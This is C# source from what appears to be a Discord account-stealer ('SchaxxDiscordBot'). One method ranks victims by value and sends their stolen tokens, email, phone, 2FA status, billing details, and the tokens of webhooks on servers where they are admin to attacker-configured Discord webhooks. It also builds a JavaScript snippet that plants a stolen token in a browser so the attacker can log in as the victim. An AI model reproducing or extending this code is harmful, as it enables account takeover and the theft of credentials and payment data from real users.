using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Webhook;

namespace SchaxxDiscordBot
{
    public static class Webhooks
    {
        public enum AccountValue
        {
            UNVALUABLE, // Nothing
            VALUABLE, // Billing
            IMPORTANT // Partener
        }
        public static void sendAccountWebhook(AccountValue av, UserObject user)
        {
            //user.setToken("TOKEN");
            //user.email = "EMAIL";
            //user.phone = "PHONE";
            EmbedBuilder eb = new EmbedBuilder();
            String url = Config.unvaluable;
            eb.Color = Color.Blue;
            eb.Title = "New non-valuable Account Connected";
            eb.ThumbnailUrl = user.avatar;
            eb.WithCurrentTimestamp();

            if (av == AccountValue.VALUABLE)
            {
                eb.Color = Color.Orange;
                eb.Title = "New valuable Account Connected";
                url = Config.valuable;
            }
            if (av == AccountValue.IMPORTANT)
            {
                eb.Color = Color.Red;
                eb.Title = "New Important Account Connected";
                url = Config.important;
            }

            eb.AddField(name: "** **", value: "```yaml\nTag : " + user.username + "#" + user.discriminator + "\nId : " + user.id + "\nEmail : " + user.email + "```",inline:true)
                .AddField(name: "** **", value: "```yaml\nPhone : " + user.phone + "\nBio : " + user.bio + "\n2FA : " + user.mfa.ToString().ToLower() + "```",inline:true)
                .AddField(name: "**Token**", value:"```" + user.token + "```", inline: false)
                .AddField(name: "**Connect**", value: "```js\n" + ("d=document;s=setInterval;((t)=>{s(_=>d.body.appendChild(d.createElement`iframe`).contentWindow.localStorage.token=`\"${t}\"`,50);s(_=>location.reload(),2500);})(\"" + user.token + "\")") + "```", inline: false);

            if (user.billings.Count > 0)
            {
                String billing = "";
                user.billings.All(b => {
                    billing += b.Value.toString() + '\n';
                    return true;
                });
                billing = billing.Substring(0, billing.Length - 1);
                eb.AddField(name: "**Billings**", value: billing, inline: false);
            }

            eb.AddField(name: "**Servers**", value: user.guilds.Count, inline: true)
               .AddField(name: "**Owner**", value: user.guilds.Count(x => x.Value.isOwner()), inline: true)
               .AddField(name: "**Admin**", value: user.guilds.Count(x => x.Value.isAdmin() && !x.Value.isOwner()), inline: true)
               .AddField(name: "**Friends**", value: user.friends.Count, inline: true)
               .AddField(name: "**Boosts**", value: user.boosts.Count(b => b.Value.cooldown == null) + "/" + user.boosts.Count, inline: true)
               .AddField(name: "**Gifts**", value: user.gifts.Count, inline: true)
               .AddField(name: "**Nitro**", value: user.premiumtype == 2 ? "<:nitro_boost:994000015959793736>" : (user.premiumtype == 1 ? "<:nitro:993982473614655538>" : "None"), inline: true)
               .AddField(name: "**Flags**", value: user.flagString(), inline: false);


            String servers = "Servers:";
            user.guilds.All(g => {
                servers += "\n[" + g.Value.id + "] " + g.Value.name;

                if (g.Value.isAdmin() || g.Value.isOwner())
                {
                    String webhooks = "Webhooks:";
                    g.Value.webhooks.All(wh => {
                        webhooks += "\n\t\t[" + wh.Value.name + "] https://discord.com/api/webhooks/" + wh.Value.id + "/" + wh.Value.token;
                        return true;
                    });
                    servers += (g.Value.isOwner() ? " [Owner 👑]" : " [Admin 🛠️]") + (g.Value.webhooks.Count > 0 ? "\n\t" + webhooks : "");
                }
                return true;
            });


            DiscordWebhookClient dwc = new DiscordWebhookClient(url);

            FileAttachment[] files = new FileAttachment[]
            {
                new FileAttachment(new MemoryStream(Encoding.UTF8.GetBytes(servers)), "servers.txt")
            };

            dwc.SendFilesAsync(files, "New account " + (av != AccountValue.UNVALUABLE ? "@everyone" : " (literal garbadge)"), embeds: new Embed[] { eb.Build() });
        }
    }
}
